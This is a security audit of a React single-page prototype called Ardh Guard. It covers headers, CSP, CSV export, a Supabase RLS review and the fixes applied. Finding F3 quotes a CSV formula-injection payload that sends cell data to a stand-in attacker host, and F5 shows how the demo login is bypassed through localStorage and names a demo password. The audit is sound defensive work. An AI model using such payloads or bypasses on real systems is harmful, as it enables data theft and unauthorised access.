# Security audit: Ardh Guard (v2 shell)

Audit date: 22 Oct 2026. Scope: this repository (React 19 + Vite + Tailwind single-page app [13][14][15], hosted on Vercel [16], dummy data only). Method: code review, dependency and secret scans, and **proof-of-concept tests that were actually run** against the dev server and the report code. Fixes F1-F4 and F6 were then applied and re-tested (section 7).

Numbers in square brackets, like [24], point to the list at the bottom of this file. They are the same numbers used in the README and every other document. "Read" in that list means we opened the page; where we did not, it says so.

**Why these checks and not others.** Recent literature, as summarised in the Consensus report we were given [11], argues that practical web security has moved from "find the OWASP Top 10 bugs" to "verify trust boundaries and recovery paths end to end", and that feature checklists alone are not enough: a study of 44 web frameworks found that CSRF defences were often missing, hard to enable or misused [34][11]. So each finding below is tied to a concrete test we ran, and each fix to a published recommendation, rather than to a generic checklist.

## 1. What was and was not tested

| Done | Not done (and why) |
|---|---|
| Read all of `src/`, `index.html`, `vercel.json`, `vite.config.ts`, `public/deck`, the Supabase SQL | **Live site response headers**: the sandbox blocks the Vercel URL (HTTP 403 on CONNECT). The headers were verified on a local server that applies the exact rules from `vercel.json`. Please run `curl -I` on the live site after redeploying. |
| `npm audit`, lockfile review, secret regex scan | **Supabase SQL was reviewed, not executed.** No Postgres here. Section 5 findings need confirming on a real project. |
| 32 hostile-input builds of the HTML and JSON reports; CSV injection test | **No automated scanner** (ZAP, nuclei, Burp) was run. For a static site with no server they add little, but they are the next step for the real pilot stack. |
| Browser tests (Playwright): storage tampering, session spoof, XSS in the form and in the URL hash, framing, download and print under the new CSP | No test on real phones or browsers other than Chromium. |

## 2. Attack surface in one paragraph

The app is a static bundle. There is **no server code, no database call, no cookie, no upload, no network request from the app** (`fetch`, `XMLHttpRequest`, `WebSocket` and `postMessage` do not appear in `src/`). All state is in `localStorage` (language, theme, demo session, officer decisions). So most server-side checklist items do not apply today. What matters: browser hardening (headers and CSP), the HTML and CSV files the app generates, the npm supply chain [33], and getting the future Supabase backend [17] right.

## 3. Findings

Severity is for the app as it is (dummy data). "Pilot" severity is what it would be with real records.

| ID | Finding | Now | Pilot | Evidence | Status |
|---|---|---|---|---|---|
| F1 | No security headers: no CSP, no `frame-ancestors`, no `nosniff`, no `Referrer-Policy`, no `Permissions-Policy` | Medium | High | `vercel.json` had only a rewrite. The login page loaded inside a cross-origin `<iframe>` (clickjacking possible) [26]. | **Fixed** |
| F2 | Third-party stylesheet from Google Fonts | Low | Medium | It leaks every visitor's IP and referrer to Google and blocks a strict `style-src`/`font-src 'self'` CSP [24]. SRI cannot be applied to it because Google serves different CSS per browser. | **Fixed** |
| F3 | CSV formula injection: `toCsv` quoted but did not neutralise cells starting with `=`, `+`, `-`, `@`, tab or CR | Low | Medium | `=HYPERLINK("http://evil.example/?x="&A1,"click")` came out as a live formula. Not exploitable today (cells come from the static registry), but it would be as soon as names come from users [28][29]. | **Fixed** |
| F4 | Tampered or corrupt `localStorage` blanked the whole app | Low | Low | `ardh.decisions.v1 = null` threw `Cannot read properties of null`, with no error boundary. | **Fixed** |
| F5 | The sign-in is a front-end gate: the session is the account email in `localStorage`, and the four passwords are in the JS bundle | Info (by design) | **Critical if mistaken for real** | Opening the app with only `ardh.session.v2=auditor@ardh.demo` gave the admin dashboard. The bundle contains `Audit@2026`. Documented in README, PLAN and the limits page. Secrets compiled into bundles are a known blind spot of source-only scanning [35][32]. | Accepted for the demo; never front real records |
| F6 | Generated report HTML had no CSP, and the print dialog loads it in a same-origin `srcdoc` iframe | Low | Medium | Escaping was correct (4.1), but if `esc()` regressed, injected script would run with the app's origin and `localStorage`. | **Fixed** |
| F7 | Officer decisions have no actor, timestamp or tamper evidence, and are stored per browser | Low | High | `decisions.ts` stores `{ "<deed>:<rule>": "hold" }` only. | Open: pilot design work (fix 10) |

## 4. Things that held up

4.1 **Output escaping.** 32 hostile builds (8 payloads x officer/citizen x Bangla/English: attribute breakers, `</style>`, `</title>`, `javascript:`, entity tricks, template literal) in seller and buyer: nothing unescaped; JSON stayed valid. `esc()` did not escape `'`; OWASP's rule covers five characters including the single quote [27], so it now does (fix 5).
4.2 **XSS in the UI.** No `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, `document.write` or `window.open` anywhere in `src/`. A payload typed into the Check form and one placed in `#/cases/<id>` were not executed.
4.3 **Routing.** Only constants go to `location.replace`; the hash is never used as a redirect target.
4.4 **Dependencies.** `npm audit`: 0 vulnerabilities. Every package resolves from `registry.npmjs.org`. The only install script is `fsevents` (optional, macOS). No `postinstall` in the project. No source maps in the production build.
4.5 **Secrets.** No keys, tokens or private keys in the repo. `.env` is gitignored; `.env.example` has empty placeholders. The only hits were the intentional demo passwords.
4.6 **Privacy by design.** Existing tests check that the citizen report never carries other people's names, deed numbers or the identity step.
4.7 **No external scripts**, so SRI is not needed.

## 5. Supabase schema review (static; for the pilot, not live yet)

`supabase/migrations/0001_init.sql` is careful in places (immutable audit log with hash chain, constraints, `approve_mutation` as the only path to change holdings). Issues to fix before any real data:

| ID | Finding | Why it matters |
|---|---|---|
| S1 | RLS policies are `to authenticated using (true)` for read on all tables including `audit_log` and `parties`, and `with check (true)` for insert on deeds, mutations, parcels, parties, khatians | Supabase's own guidance is to enable RLS on every exposed table and to write policies that actually restrict by role [30]. Today any signed-in user, including a self-registered citizen if sign-ups are on, can read everything and insert deeds. That contradicts the four-role model and the citizen-privacy rule. |
| S2 | `verify_deed` is `security definer` and granted to `anon` | Anyone on the internet can probe deed numbers and learn whether a deed exists, its status and risk level, with no rate limit. |
| S3 | `approve_mutation`, `write_audit` and the other functions have no `revoke ... from public` | PostgreSQL grants EXECUTE to PUBLIC by default and advises revoking it and granting selectively; for `security definer` functions it also advises fixing `search_path` [31]. Supabase exposes `public` functions over its API [30]. They run as the caller today, so RLS should block them (to confirm on a real project), but one change to `security definer` would expose them. |
| S4 | No role claim or profile table, so nothing separates sub-registrar, AC Land officer, admin/auditor, citizen | Needed to turn the demo roles into server-side authorisation. |
| S5 | Never put the `service_role` key in a `VITE_` variable | Vite copies `VITE_*` variables into the client bundle and says they must not hold sensitive information such as API keys [32]. The service role bypasses RLS [30]. Only the anon key belongs in the browser. |

## 6. Your checklist, applied to this project

Legend: **N/A** = no such component exists here. **Pass**, **Gap**, **Later** = needed when the backend arrives.

| Checklist area | Status | Notes |
|---|---|---|
| CSP | **Fixed (F1)** | Policy in section 7, following the OWASP guidance on strict policies, `object-src`, `base-uri` and `frame-ancestors` [24]. OWASP also says CSP is a second layer, not a replacement for output encoding, which is why F6 and 4.1 matter too. |
| SRI | Pass / N/A | No third-party scripts. Google Fonts CSS cannot use SRI, so the font is now self-hosted (F2). |
| Security headers, HSTS, HTTPS | **Fixed (F1)** / live check pending | Values follow OWASP's header sheet [25]. We did not add HSTS `preload`, because the same sheet warns to understand the preload requirements first (it is hard to undo). |
| Clickjacking | **Fixed (F1)** | `frame-ancestors 'none'`, which OWASP prefers over `X-Frame-Options` [26]. Browser test: framing from another origin is blocked. |
| SameSite / HttpOnly / Secure cookies | N/A now, **Later** | No cookies. If Supabase Auth keeps its token in `localStorage`, XSS becomes the main threat to sessions, which makes the CSP more important. |
| Browser XSS filters | N/A | `X-XSS-Protection` is obsolete; omit it. |
| Session management, logout, rotation | N/A now, **Later** (F5) | Logout clears the demo session only. |
| Login brute-force, lockout, CAPTCHA, MFA | N/A now, **Later** | Cannot be enforced in a browser. Use Supabase Auth rate limits plus CAPTCHA, and MFA for officer roles. |
| Input validation | Pass | No interpreter reaches user input (no SQL, shell or template engine here). |
| Output encoding | Pass (4.1) | React escapes the UI; `esc()` escapes reports and now covers `'` [27]. |
| SQLi / ORM / least privilege / RLS | **Later (S1-S4)** | Good constraints and triggers; RLS is too open [30]. |
| API security, GraphQL, gRPC | N/A | No API yet. When added, scope by role and rate-limit `verify_deed`. |
| File upload and zip-slip | N/A | No upload. |
| Static file protection | Pass | `public/` holds only the favicon, fonts and the pitch deck. |
| Zero trust, containers, serverless, IaC | N/A | Static hosting. |
| WAF, DDoS, CDN, bot management | Provided by Vercel's edge | Fine for a static site. Revisit with a real API. |
| Secrets management and scanning | Pass, **CI added** | gitleaks runs in CI. Runtime-aware scanning of the deployed bundle is a further step [35]. |
| Dependency and supply-chain malware | Pass, **CI added** | Lockfile, `npm ci`, `npm audit --audit-level=high` and Dependabot. Bundles can hide vulnerable packages, so review new dependencies [33]. |
| Malware via generated files | **Fixed (F3, F6)** | Reports are plain HTML/CSV/JSON with no script; CSV formulas are neutralised and the report HTML carries its own CSP. |
| Ransomware / destructive recovery | Pass | The site is rebuilt from git; there is no server state to encrypt. Keep the repo and Vercel account protected with 2FA. |
| SIEM, EDR, incident plan | Later | For the pilot: log sign-ins and decisions server-side, and write a short incident plan. |
| AI/ML defences, post-quantum | N/A | No AI in the app. TLS is handled by Vercel. |

**Corrections to the checklist** (so they do not mislead the team): `X-XSS-Protection` should be dropped, not "tested". `Feature-Policy` was renamed to `Permissions-Policy` [25]. A failed SRI check blocks the resource in the browser; it does not return a 404. `Content-Security-Policy-Report-Only` is a separate header, not a directive to mix into one policy. Binding sessions to User-Agent plus screen size is fragile and privacy-hostile; prefer short-lived tokens with rotation. Kubernetes Pod Security Policies were removed in v1.25 (use Pod Security Admission). Post-quantum protection today means hybrid key exchange in TLS, handled by the browser and CDN.

## 7. What was changed, and how it was checked

| Fix | Change | Basis |
|---|---|---|
| 1 | `vercel.json` sends a CSP (`default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`), `nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()`, `Cross-Origin-Opener-Policy: same-origin` and HSTS (`max-age=63072000; includeSubDomains`). `/deck/*` has its own block that allows inline script and style, because the deck is one self-contained page. `style-src 'unsafe-inline'` stays because the map sets inline style attributes. | [24][25][26] |
| 2 | Inter is self-hosted (`public/fonts/Inter-latin-variable.woff2`, SIL OFL 1.1, 48 KB) and the Google Fonts links are removed. | [24] |
| 3 | `toCsv` prefixes a `'` to text cells starting with `= + - @`, tab, CR, LF or the full-width forms. Real numbers are left alone. **Limit:** OWASP notes Excel can drop the quote after a save and reopen, so this lowers the risk but is not a guarantee; the real fix is not putting untrusted text in exports. | [28][29] |
| 4 | Saved decisions are validated on load (plain object, known values only), and a React error boundary offers "Reset local data" instead of a blank page. | project tests |
| 5 | Reports carry a CSP `<meta>` (`default-src 'none'`, inline style, data images, the font origin only). `esc()` now escapes `'`. The font URL is checked before it goes into the stylesheet. The 32-build hostile test is now permanent in `scripts/test-report.ts`. | [27][24] |
| 6 | `.github/workflows/ci.yml` (`npm ci`, `npm audit --audit-level=high`, build, tests, gitleaks) and `.github/dependabot.yml`. | [33] |

**Verification run after the fixes** (local server applying the `vercel.json` rules, Chromium): the CSP and `nosniff` headers are present; sign-in, dashboard, cases, buy and the deck load with **zero console or CSP violations**; **zero external requests** (the Google Fonts request is gone) and Inter loads; framing from another origin is blocked; setting `ardh.decisions.v1` to `null` no longer breaks the app; the HTML report download and the print dialog still work. `npm run build` and `npm test` pass, including the new CSV, decisions and hostile-report tests.

## 8. Still to do before any pilot with real data (design work, needs decisions)

8. Real authentication (Supabase Auth), one profile row per user with a role, and RLS written per role: citizens see only their own checks; sub-registrar and AC Land see only their checkpoint; admin/auditor read-only. Drop the open `using (true)` policies [30].
9. Remove `anon` from `verify_deed` or put it behind rate limiting and a CAPTCHA, and make it return only what a citizen may know. `revoke execute ... from public` on every function, set `search_path` on `security definer` functions, then grant per role [31].
10. Store decisions server-side with actor and time, through the existing hash-chained audit log (F7); run `verify_audit_chain()` on a schedule.
11. MFA for officer and admin roles; server-side rate limits and lockout; keep `service_role` out of the browser entirely [32].
12. Run ZAP or nuclei against the staging deployment, scan the deployed bundle for secrets [35], and have someone other than the author review the RLS policies.
13. Re-check the live site's headers with `curl -I` after redeploying.

<!-- refs:start -->
## References

[11] Consensus (2026). AI-generated literature search reports used for scoping (P3 gap analysis; CS, SA, RS, BS chain; e-services). [Consensus: AI research assistant](https://consensus.app)  
[13] React: the library for web and native user interfaces. [React](https://react.dev)  
[14] Vite: next generation frontend tooling. [Vite](https://vite.dev)  
[15] Tailwind CSS: a utility-first CSS framework. [Tailwind CSS](https://tailwindcss.com)  
[16] Vercel: hosting platform for the live prototype. [Vercel](https://vercel.com)  
[17] Supabase: Postgres development platform (planned for saving decisions and the audit trail). [Supabase](https://supabase.com)  
[24] OWASP Cheat Sheet Series. Content Security Policy Cheat Sheet. [Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)  
[25] OWASP Cheat Sheet Series. HTTP Headers Cheat Sheet. [HTTP Security Response Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)  
[26] OWASP Cheat Sheet Series. Clickjacking Defense Cheat Sheet. [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)  
[27] OWASP Cheat Sheet Series. Cross Site Scripting Prevention Cheat Sheet. [Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)  
[28] OWASP Foundation. CSV Injection. [CSV Injection](https://community.owasp.org/attacks/CSV_Injection)  
[29] MITRE. CWE-1236: Improper Neutralization of Formula Elements in a CSV File. [CWE-1236: Improper Neutralization of Formula Elements in a CSV File](https://cwe.mitre.org/data/definitions/1236.html)  
[30] Supabase Docs. Row Level Security. [Row Level Security | Supabase Docs](https://supabase.com/docs/guides/database/postgres/row-level-security)  
[31] PostgreSQL Documentation. CREATE FUNCTION. [CREATE FUNCTION (PostgreSQL documentation)](https://www.postgresql.org/docs/current/sql-createfunction.html)  
[32] Vite documentation. Env Variables and Modes. [Env Variables and Modes | Vite](https://vite.dev/guide/env-and-mode)  
[33] Rack, J. and Staicu, C.-A. (2023). Proceedings of the 2023 ACM SIGSAC Conference on Computer and Communications Security. [Jack-in-the-box: An Empirical Study of JavaScript Bundling on the Web and its Security Implications](https://doi.org/10.1145/3576915.3623140)  
[34] Likaj, X., Khodayari, S. and Pellegrino, G. (2021). Proceedings of the 24th International Symposium on Research in Attacks, Intrusions and Defenses (RAID). [Where We Stand (or Fall): An Analysis of CSRF Defenses in Web Frameworks](https://doi.org/10.1145/3471621.3471846)  
[35] Gorijala, H. (2026). IEEE Access, 14, 148273-148302. [Secrets That Survive Everything: Runtime Credential Exposure in Production Web Applications](https://doi.org/10.1109/access.2026.3734984)  

### Other project references

- [1] [LandTech Innovation Hackathon 2026 Rule Book (v1.2)](https://landtech.diu.edu.bd/landtech)
- [2] [Errors in the Land Record of Rights (Khatiyan) and the Remedial Procedure in Bangladesh: An Analysis of Existing Regulatory Framework and Future Reforms](https://doi.org/10.55327/jaash.v10i2.335)
- [3] [Essentiality of Reforms of the Registration Act 1908: E-Registration Perspective](https://doi.org/10.3329/fuj.v3i1.86557)
- [4] [The Prospect of Integrated Land Administration and Management System (ILAMS) for Improving Land Related Service Delivery in Bangladesh](https://doi.org/10.36609/bjpa.v30i2.360)
- [5] [Citizens' Perspective on Land E-Mutation at Upazila Land Offices in Mymensingh](https://doi.org/10.34104/ajssls.023.02910305)
- [6] [A Blockchain-based Land Title Management System for Bangladesh](https://doi.org/10.1016/j.jksuci.2020.10.011)
- [7] [Digitizing Land Governance in Bangladesh: A Qualitative Study of Urban and Rural Citizens' Experiences with the Digital Land Record Management System](https://doi.org/10.36481/jsp.v01.i01.3vmg5j09)
- [8] [The Impact of E-services on People's Empowerment: An Investigation into E-mutation Service of Bangladesh](https://doi.org/10.53808/KUS.2024.21.02.1177-ss)
- [9] [Digitalization of the Land Record System in Bangladesh: Prospects and Challenges](https://ssrn.com/abstract=5012153)
- [10] [Digitising land records seen as a paradigm shift](https://observerbd.com/news/555055)
- [12] [Claude (Anthropic)](https://www.anthropic.com/claude)
- [18] [Hugging Face](https://huggingface.co)
- [19] [Ardh Guard: live prototype](https://land-tech-innovation-hackathon-2026.vercel.app/)
- [20] [Ardh Guard: pitch deck](https://land-tech-innovation-hackathon-2026.vercel.app/deck/)
- [21] [Coordinated land registration, mutation to benefit over 1 crore people: Land secretary](https://www.tbsnews.net/bangladesh/coordinated-land-registration-mutation-benefit-over-1-crore-people-land-secretary-156184)
- [22] [Bangladesh's Personal Data Protection Ordinance 2025: key takeaways](https://www.thedailystar.net/tech-startup/news/bangladeshs-personal-data-protection-ordinance-2025-key-takeaways-4015401)
- [23] [EC to monitor partner organisations to protect NID data](https://www.tbsnews.net/node/664882)

Numbers are the same in every file. Full list with notes on what we read: [`docs/REFERENCES.md`](REFERENCES.md).
<!-- refs:end -->
